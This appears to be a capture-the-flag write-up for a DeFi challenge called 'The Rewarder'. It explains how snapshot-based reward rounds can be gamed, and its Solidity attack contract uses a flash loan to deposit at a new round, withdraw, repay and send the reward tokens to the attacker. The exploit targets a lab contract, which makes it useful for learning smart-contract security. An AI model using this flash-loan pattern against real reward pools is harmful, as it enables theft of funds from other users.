# The Rewarder

1. We can see in this challenge, `TheRewarderPool.sol` use `AccountingToken.sol` which implement `ERC20Snapshot` to basically snapshot the balance of users deposit at given interval time. But this can be abused, user with high amount of token can deposit at time which triger new round and get unproportionally high amount of reward.
2. To solve this challenge, we can see in `TheRewarderPool.sol` have `deposit` function which call `distributeRewards`. As mentioned before, we can call this function right after the new round time with high amount of token, to get high amount of token, we can use `FlashLoanerPool.sol` and do the attacking call in `receiveFlashLoan` callback.

```solidity
    function attack(uint256 amount) external {
        flashLoanPool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        liquidityToken.increaseAllowance(address(rewardPool), amount);
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanPool), amount);
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }
```
